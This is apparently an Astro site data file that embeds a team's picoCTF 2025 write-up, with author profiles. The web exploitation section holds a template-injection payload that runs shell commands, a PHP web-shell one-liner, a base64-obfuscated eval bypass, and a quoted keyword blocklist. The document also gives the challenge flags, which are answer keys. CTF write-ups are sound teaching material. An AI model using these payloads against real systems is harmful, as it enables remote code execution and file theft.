[["Map",1,2,9,10,30,31,93,94],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.5.6","content-config-digest","ad66b10c4652e5de","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://bwrg3r.github.io\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":true,\"port\":1234,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[]},\"devToolbar\":{\"enabled\":false},\"markdown\":{\"syntaxHighlight\":false,\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[null,null,null,null],\"rehypePlugins\":[[null,{\"target\":\"_blank\",\"rel\":[\"nofollow\",\"noreferrer\",\"noopener\"]}],null,null,[null,{\"theme\":{\"light\":\"github-light\",\"dark\":\"github-dark\"}}],[null,{\"themes\":[\"github-light\",\"github-dark\"],\"plugins\":[{\"name\":\"Collapsible sections\",\"styleSettings\":{\"defaultValues\":{\"collapsibleSections\":{\"closedBorderWidth\":\"0\",\"closedPaddingBlock\":\"4px\",\"closedMargin\":\"0\",\"closedFontFamily\":\"inherit\",\"closedFontSize\":\"inherit\",\"closedLineHeight\":\"inherit\",\"openBorderWidth\":\"1px\",\"openPadding\":\"0\",\"openMargin\":\"0\",\"openBackgroundColor\":\"transparent\",\"openBorderColor\":\"transparent\"}},\"cssVarExclusions\":[],\"cssVarReplacements\":[[\"collapsibleSections\",\"cs\"]]},\"hooks\":{}},{\"name\":\"Line numbers\",\"styleSettings\":{\"defaultValues\":{\"lineNumbers\":{\"foreground\":\"inherit\",\"highlightForeground\":\"inherit\"}},\"cssVarExclusions\":[],\"cssVarReplacements\":[]},\"hooks\":{}},{\"name\":\"astro-expressive-code\",\"hooks\":{}}],\"useDarkModeMediaQuery\":false,\"defaultProps\":{\"wrap\":true,\"collapseStyle\":\"collapsible-auto\",\"overridesByLang\":{\"ansi,bat,bash,batch,cmd,console,powershell,ps,ps1,psd1,psm1,sh,shell,shellscript,shellsession,text,zsh\":{\"showLineNumbers\":false}}},\"styleOverrides\":{\"borderColor\":\"var(--border)\",\"codeFontFamily\":\"var(--font-mono)\",\"codeBackground\":\"color-mix(in oklab, var(--secondary) 25%, transparent)\",\"frames\":{\"editorActiveTabForeground\":\"var(--muted-foreground)\",\"editorActiveTabBackground\":\"color-mix(in oklab, var(--secondary) 25%, transparent)\",\"editorActiveTabIndicatorBottomColor\":\"transparent\",\"editorActiveTabIndicatorTopColor\":\"transparent\",\"editorTabBarBackground\":\"transparent\",\"editorTabBarBorderBottomColor\":\"transparent\",\"frameBoxShadowCssValue\":\"none\",\"terminalBackground\":\"color-mix(in oklab, var(--secondary) 25%, transparent)\",\"terminalTitlebarBackground\":\"transparent\",\"terminalTitlebarBorderBottomColor\":\"transparent\",\"terminalTitlebarForeground\":\"var(--muted-foreground)\"},\"lineNumbers\":{\"foreground\":\"var(--muted-foreground)\"},\"uiFontFamily\":\"var(--font-sans)\"}}]],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"responsiveImages\":false,\"serializeConfig\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false},\"legacy\":{\"collections\":false}}","blog",["Map",11,12],"picoctf2025",{"id":11,"data":13,"body":24,"filePath":25,"assetImports":26,"digest":28,"deferredRender":29},{"title":14,"description":15,"date":16,"image":17,"tags":18,"authors":20},"picoCTF 2025","A compilation of picoCTF 2025 Writeups",["Date","2025-03-21T00:00:00.000Z"],"__ASTRO_IMAGE_./1200x630.png",[19],"picoCTF",[21,22,23],"gr1d","w_11","bakayang","## [Reverse Engineering]\n\n## Flag Hunters  \n![](./assets/re/flag_hunt/question.png)  \n---\n### Goals\nWhen the program starts, the lip is set to the line [VERSE], to retrieve the secret_intro, we need to alter the program so the lip variable set to the line of flag\n```\nPico warriors rising, puzzles laid bare,\nSolving each challenge with precision and flair.\nWith unity and skill, flags we deliver,\nThe etherâ€™s ours to conquer, '''\\\n+ flag + '\\n'\n```\nas shown, flag is at line 4\n\nso passing index 0 to 3 will works, printing at the start of the lines at most line 4, index 3\n\n**Payload:** `\u003Cany_text>;RETURN \u003C0 to 3>   (This is not injection)`\n### Final Result\n---\n**Flag:** `picoCTF{70637h3r_f0r3v3r_c659e814}`\n\n\n## Quantum Scrambler  \n![](./assets/re/quantum/question.png)  \n---\n### Goals\n1. Decrypt the encryption and retrieve the flag\n2. Dissect the elements, and observe the scramble\n3. Found final payload, decrypt with reversed scrambler\n---\n### Solution\nReversed scrambler:\n```python\nimport ast\n\ndef flatten(lst):\n    flat = []\n    for item in lst:\n        if isinstance(item, list):\n            flat.extend(flatten(item))\n        else:\n            flat.append(item)\n    return flat\n\ndef unscramble(cypher):\n    print(\"Outer list elements:\")\n    for index, element in enumerate(cypher):\n        print(f\"Element {index}: {element}\")\n    print(\"-\" * 40)\n    \n    flat_list = flatten(cypher)\n    \n    hex_strings = [s for s in flat_list if isinstance(s, str) and s.startswith(\"0x\")]\n    \n    flag_chars = [chr(int(h, 16)) for h in hex_strings]\n    flag = ''.join(flag_chars)\n    return flag\n\ndef main():\n    input_file = 'output.txt'\n    \n    try:\n        with open(input_file, 'r') as f:\n            cipher_text = f.read()\n    except Exception as e:\n        print(f\"Error reading file {input_file}: {e}\")\n        return\n    \n    try:\n        cypher = ast.literal_eval(cipher_text)\n    except Exception as e:\n        print(\"Error interpreting cipher text:\", e)\n        return\n    \n    flag = unscramble(cypher)\n    print(\"Recovered flag:\", flag)\n\nif __name__ == '__main__':\n    main()\n``` \n**Final payload:** `[['0x70'],['0x69'],['0x63'],['0x6f'],['0x43'],['0x54'],['0x46'],['0x7b'],['0x70'],['0x79'],['0x74'],['0x68'],['0x6f'],['0x6e'],['0x5f'],['0x69'],['0x73'],['0x5f'],['0x77'],['0x65'],['0x69'],['0x72'],['0x64'],['0x65'],['0x66'],['0x38'],['0x65'],['0x61'],['0x30'],['0x63'],['0x66'],['0x7d']]`  \n_Save this as output.txt_\n\n### Final Result\n---\n**Flag:** `picoCTF{python_is_weirdef8ea0cf}`\n\n\n## Binary Instrumentation 1  \n![](./assets/re/bininst1/question.png)  \n---\n### Goals\n1. The binary bininst1.exe calls the `Sleep` function from kernel32.dll\n2. Using frida-trace, we generate the handler scripts for API functions\n3. Intercept any call to `Sleep`, in this case, under `KERNEL32.dll`\n4. We then set sleep duration to 0, avoiding the program from sleeping.\n---\n### Solution\n1. Using frida-trace\n```bash\nfrida-trace -i \"Sleep\" ./bininst1.exe\n```\n\n2. Intercept the handler, by modifying the handler generated, changing sleep duration to zero.\n```js\n// KERNEL32.DLL/Sleep.js\nvar sleepAddr = Module.getExportByName(\"kernel32.dll\", \"Sleep\");\nInterceptor.attach(sleepAddr, {\n    onEnter: function (args) {\n        // Log the original sleep duration (for debugging)\n        console.log(\"Original sleep time: \" + args[0].toInt32());\n        // Change the sleep duration to 0\n        args[0] = ptr(0);\n    }\n});\n```\n### Final Result\n---\n**Flag:** `picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}`\n\n\n## Binary Instrumentation 2  \n![](./assets/re/bininst2/question.png)  \n---\n### Goals\n1. Disassemble with ghidra, look for suspicious function\n2. Hook with frida\n---\n### Solution\n1. Deploy the script that hook suspicious function at `0x1dc0`\n```js\n// Get the module base address for bininst2.exe\nvar moduleBase = Module.findBaseAddress(\"bininst2.exe\");\nconsole.log(\"Module base address: \" + moduleBase);\n\n// Calculate the target function address using a known offset (update this offset as needed)\nvar funOffset = 0x1dc0; // Adjust this based on your analysis\nvar targetFunction = moduleBase.add(funOffset);\nconsole.log(\"Hooking function at: \" + targetFunction);\n\n// Hook the target function (FUN_140001dc0)\nInterceptor.attach(targetFunction, {\n    onEnter: function(args) {\n        // Assume:\n        //   args[0] is a pointer to the flag data\n        //   args[1] is the length of the flag data\n        var length = args[1].toInt32();\n        try {\n            // Try to read the flag data as a UTF-8 string\n            var flagData = Memory.readUtf8String(args[0], length);\n            console.log(\"Flag data intercepted (utf8): \" + flagData);\n        } catch (err) {\n            console.log(\"Error reading flag data as UTF-8: \" + err);\n            // If reading as a string fails, dump the raw bytes\n            console.log(\"Flag data intercepted (raw):\\n\" + hexdump(args[0], { length: length, header: true, ansi: false }));\n        }\n    },\n    onLeave: function(retval) {\n        console.log(\"FUN_140001dc0 returned: \" + retval);\n    }\n});\n```\n2. Run the script, then find for the flag\n```bash\nfrida -l \u003Cscript>.js -f ./bininst2.exe\n```\n\n### Final Result\n---\nBase64 Encoded Flag:  \n![](./assets/re/bininst2/solution.png)  \n**Flag:** `picoCTF{fr1da_f0r_b1n_in5trum3nt4tion!_b21aef39}`\n\n\n\n## [Forensics]\n\n## RED  \n![](./assets/forensics/red/question.png)  \n---\n### Goals\n1. Steganography, just upload to Aperi'Solve, ez flag\n---\n### Solution\n\n![](./assets/forensics/red/solution.png)   \n\n### Final Result\n---\n**Flag:** `picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}`\n\n\n## flags are stepic  \n![](./assets/forensics/stepic/question.png)  \n---\n### Goals\n1. Find the country that doesn't exist, the flag persists\n2. Download the country flag\n3. Search for stepic tool  \n        - https://shankaraman.wordpress.com/tag/ctf/  \n        - https://code.tools/man/1/stepic/  \n        - https://pypi.org/project/stepic/  \n4. Install stepic tool through pip\n5. Unhide the flag\n---\n### Solution\n\n![](./assets/forensics/stepic/upz.gif)  \n\n### Final Result\n---\n**Flag:** `picoCTF{fl4g_h45_fl4g57f48d94}`\n\n\n## Ph4nt0m 1ntrud3r  \n![](./assets/forensics/phantom/question.png)  \n---\n### Goals\n1. Sort the time, since the reference times are messed up\n2. Decode flag encoded in base64 in a series of consecutive packets\n---\n### Solution\n\n![](./assets/forensics/phantom/solution.gif)  \n\n### Final Result\n---\n**Flag:** `picoCTF{1t_w4snt_th4t_34sy_tbh_4r_e5e8c78d}`\n\n\n## Event-Viewing  \n![](./assets/forensics/event/question.png)\n---\n### Goals\n1. Lookup 1033 Event, msi package install event id\n2. Filter with date and time, look for suspicious event after 1033 happen within a short time range, about 20 minutes, found\n3. \"EVERY TIME\" \\\u003C---(from question), so clear date and time filter, find with keyword \"shutdown.exe\" throughout whole event log\n---\n### Solution\n\nPart 1:  \n![](./assets/forensics/event/part1log.png)  \n**Base64:** `cGljb0NURntFdjNudF92aTN3djNyXw==`\n**Flag 1:** `picoCTF{Ev3nt_vi3wv3r_`\n\nPart 2:  \n![](./assets/forensics/event/part2log.png)\n**Base64:** `MXNfYV9wcjN0dHlfdXMzZnVsXw==`\n**Flag 2:** `1s_a_pr3tty_us3ful_`\n\nPart 3:  \n![](./assets/forensics/event/part3log.png)  \n**Base64:** `dDAwbF84MWJhM2ZlOX0=`\n**Flag 3:** `t00l_81ba3fe9}`\n\n\n### Final Result\n---\n**Flag:** `picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}`\n\n\n\n## Rust Fixme 1\n### Solution\n1. First download the Zip file from the chal.\n2. Take a look inside the code and run it.\n![](./assets/forensics/rustfixme1/inside.png)  \n3. So lets solve all the problem\n4. First add the semicolon on the first error.![](./assets/forensics/rustfixme1/firstly.png)  \n5. Next add return at the ret(wrong)->return given.\n![](./assets/forensics/rustfixme1/next.png)  \n6. Last change the things inside the println function to {}![](./assets/forensics/rustfixme1/lastly.png)  \n\nHere are the original code\n\n![](./assets/forensics/rustfixme1/firsterr.png)  \nFirst error.\n\n![](./assets/forensics/rustfixme1/secerr.png)  \nSecond error.\n\n![](./assets/forensics/rustfixme1/thirderr.png)  \nThird Error.\n\n### Final Result\n---\n![](./assets/forensics/rustfixme1/final.png)  \n**Flag:** `picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}`\n\n\n## [Binary Exploitation]\n\n## PIE TIME  \n![](./assets/pwn/pie1/question.png)\n---\n### Goals\n1. Call the win() function\n---\n### Solution\n\n1. Disassemble with gdb  \n![](./assets/pwn/pie1/disass.png)  \n\n2. Observe the difference in address between main function and win function\nThe difference is 0x96, thus, to call the function's address, it must always be `main()` - `0x96`\n\n### Final Result\n---\nLaunch the challenge  \n![](./assets/pwn/pie1/solution.png)  \n**Flag:** `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}`\n\n\n\n## [General Skills]\n\n## YaraRules0x100  \n![](./assets/misc/yara/question.png)  \n---\n### Goals\n1. To detect malware sample with YARA rule while avoiding false positives and false negatives.\n2. Malware can exist in packed(obfuscated) or unpacked(fully extracted in memory), the rule should cover both version.\n---\n### Solution\n\n```\nrule suspacked\n{\n    strings:\n        $packed_div = \".text$div\"\n\n    condition:\n        all of them\n}\n\nrule susunpacked\n{\n    strings:\n        $unpacked_xml = \"\u003C?xml version='1.0' encoding='UTF-8' standalone='yes'?>\"\n        $unpacked_dll = \"ADVAPI32.dll\"\n\n    condition:\n        all of them\n}\n```  \n1. Search for yara rule, follow the hint given, work with the format:\nhttps://yara.readthedocs.io/en/stable/writingrules.html\n2. Open file with ghidra, search for strings, do trial and error\n### Final Result\n---\n**Flag:** `picoCTF{yara_rul35_r0ckzzz_74c37bd8}`\n\n---\n## [Web Exploitation]\n\n## SSTI 1\n\n- located at /challenge/flag\n\n- payload: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}`\n\n**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}`\n\n---\n\n## n0s4n1ty 1\n\npayload: `shell.php : \u003C?php system($_GET['cmd']); ?>`\n\n- hidden in /challenge/metadata.json\n\n- ran (sudo cat /challenge/metadata.json)\n\n**Flag:** `picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}`\n\n---\n## 3v@l\n\n- Command injection\n\n```\n# app.py\nfrom flask import Flask, request, render_template_string, render_template\nimport re\n\napp = Flask(__name__)\n\n# Define blocklist keywords and regex for file paths\nBLOCKLIST_KEYWORDS = ['os', 'eval', 'exec', 'bind', 'connect', 'python','python3', 'socket', 'ls', 'cat', 'shell', 'bind']\nFILE_PATH_REGEX = r'0x[0-9A-Fa-f]+|\\\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.'\n\n\n@app.route('/')\ndef index():\n    return render_template('index.html/')\n\n@app.route('/execute', methods=['POST'])\ndef execute():\n    code = request.form['code']\n\n    # Check for blocklist keywords in submitted code\n    for keyword in BLOCKLIST_KEYWORDS:\n        if keyword in code:\n            return render_template('error.html', keyword=keyword)\n\n    # Check for file path using regex\n    if re.search(FILE_PATH_REGEX, code):\n        return render_template('error.html')\n\n    try:\n        # Execute the Python code if no blocklist keyword or file path found\n        result = eval(code)\n    except Exception as e:\n        result = f\"Error: {str(e)}\"\n\n    return render_template('result.html', result=result)\n\nif __name__ == '__main__':\n    app.run(debug=True, host=\"0.0.0.0\", port=5000)\n```\n---\n\n### Payload\n\n```\ncode=__import__('subprocess').getoutput(__import__('base64').b64decode('Y2F0IC9jaGFsbGVuZ2UvZmxhZy5weQ==').decode())\n```\n\n**Flag:** `picoCTF{D0nt_Use_Unsecure_f@nctionsb95fffac}`\n\n---","src/content/blog/picoctf2025/index.mdx",[27],"./1200x630.png","08962eae720cd754",true,"authors",["Map",23,32,21,49,22,64,79,80],{"id":23,"data":33,"filePath":39,"digest":40,"rendered":41},{"name":23,"pronouns":34,"avatar":35,"bio":36,"website":37,"github":38},"he/him","https://bakayang.vercel.app/images/kirby.png","You have one shot, one opportunity.","https://bakayang.vercel.app/","https://github.com/Exberg","src/content/authors/bakayang.md","316c37d657e970cf",{"html":42,"metadata":43},"",{"headings":44,"localImagePaths":45,"remoteImagePaths":46,"frontmatter":47,"imagePaths":48},[],[],[],{"name":23,"pronouns":34,"avatar":35,"bio":36,"website":37,"github":38},[],{"id":21,"data":50,"filePath":55,"digest":56,"rendered":57},{"name":21,"pronouns":34,"avatar":51,"bio":52,"website":53,"github":54},"https://avatars.githubusercontent.com/u/83480366?v=4","No logs, No traces...","https://gr1d-init.github.io/","https://github.com/gr1d-init","src/content/authors/gr1d.md","44acb4cd6d5506f8",{"html":42,"metadata":58},{"headings":59,"localImagePaths":60,"remoteImagePaths":61,"frontmatter":62,"imagePaths":63},[],[],[],{"name":21,"pronouns":34,"avatar":51,"bio":52,"website":53,"github":54},[],{"id":22,"data":65,"filePath":70,"digest":71,"rendered":72},{"name":22,"pronouns":34,"avatar":66,"bio":67,"website":68,"github":69},"https://avatars.githubusercontent.com/u/130538576?v=4","HTTP 200 : Exploitation Success","https://weixuan0110.github.io/","https://github.com/weixuan0110","src/content/authors/w_11.md","e15764d23f5d0817",{"html":42,"metadata":73},{"headings":74,"localImagePaths":75,"remoteImagePaths":76,"frontmatter":77,"imagePaths":78},[],[],[],{"name":22,"pronouns":34,"avatar":66,"bio":67,"website":68,"github":69},[],"hoezhiwan",{"id":79,"data":81,"filePath":84,"digest":85,"rendered":86},{"name":79,"pronouns":34,"avatar":82,"github":83},"https://avatars.githubusercontent.com/u/89591638?v=4","https://github.com/HoeZhiWan","src/content/authors/hoezhiwan.md","c40ee5bf3f8b63ab",{"html":42,"metadata":87},{"headings":88,"localImagePaths":89,"remoteImagePaths":90,"frontmatter":91,"imagePaths":92},[],[],[],{"name":79,"pronouns":34,"avatar":82,"github":83},[],"projects",["Map",95,96,123,124,142,143],"project-a",{"id":95,"data":97,"filePath":109,"assetImports":110,"digest":112,"rendered":113},{"name":98,"description":99,"tags":100,"image":105,"link":106,"startDate":107,"endDate":108},"Project A","This is an example project description! You should replace this with a description of your own project.",[101,102,103,104],"Framework A","Library B","Tool C","Resource D","__ASTRO_IMAGE_../../../public/static/1200x630.png","https://example.com",["Date","2024-01-01T00:00:00.000Z"],["Date","2024-02-01T00:00:00.000Z"],"src/content/projects/project-a.md",[111],"../../../public/static/1200x630.png","3d4f4ac7baea4714",{"html":42,"metadata":114},{"headings":115,"localImagePaths":116,"remoteImagePaths":117,"frontmatter":118,"imagePaths":122},[],[],[],{"name":98,"description":99,"tags":119,"image":111,"link":106,"startDate":120,"endDate":121},[101,102,103,104],"2024-01-01","2024-02-01",[],"project-b",{"id":123,"data":125,"filePath":130,"assetImports":131,"digest":132,"rendered":133},{"name":126,"description":99,"tags":127,"image":105,"link":106,"startDate":128,"endDate":129},"Project B",[101,102,103,104],["Date","2024-02-01T00:00:00.000Z"],["Date","2024-03-01T00:00:00.000Z"],"src/content/projects/project-b.md",[111],"d786c69cb8a53e6d",{"html":42,"metadata":134},{"headings":135,"localImagePaths":136,"remoteImagePaths":137,"frontmatter":138,"imagePaths":141},[],[],[],{"name":126,"description":99,"tags":139,"image":111,"link":106,"startDate":121,"endDate":140},[101,102,103,104],"2024-03-01",[],"project-c",{"id":142,"data":144,"filePath":148,"assetImports":149,"digest":150,"rendered":151},{"name":145,"description":99,"tags":146,"image":105,"link":106,"startDate":147},"Project C",[101,102,103,104],["Date","2024-03-01T00:00:00.000Z"],"src/content/projects/project-c.md",[111],"1fbd50259edaa4f9",{"html":42,"metadata":152},{"headings":153,"localImagePaths":154,"remoteImagePaths":155,"frontmatter":156,"imagePaths":158},[],[],[],{"name":145,"description":99,"tags":157,"image":111,"link":106,"startDate":140},[101,102,103,104],[]]